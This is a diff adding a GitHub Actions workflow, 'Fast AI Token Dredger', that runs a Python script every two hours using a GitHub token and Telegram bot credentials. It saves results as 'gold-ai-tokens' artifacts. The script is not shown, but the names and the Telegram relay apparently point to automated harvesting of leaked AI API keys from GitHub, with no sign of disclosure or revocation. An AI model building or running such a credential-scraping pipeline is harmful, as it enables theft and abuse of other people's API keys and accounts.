@@ -1,0 +1,35 @@
+name: Fast AI Token Dredger
+
+on:
+  schedule:
+    - cron: "0 */2 * * *"  # Otomatis sedot tiap 2 jam sekali
+  workflow_dispatch:
+
+jobs:
+  dredge-ai-tokens:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 30
+    steps:
+      - name: Checkout Repo
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Run Fast AI Dredger
+        env:
+          GH_PAT: ${{ secrets.GH_PAT }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          python -u fast_dredger.py
+
+      - name: Upload Gold Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gold-ai-tokens
+          path: findings_gold_ai.json
+          if-no-files-found: ignore
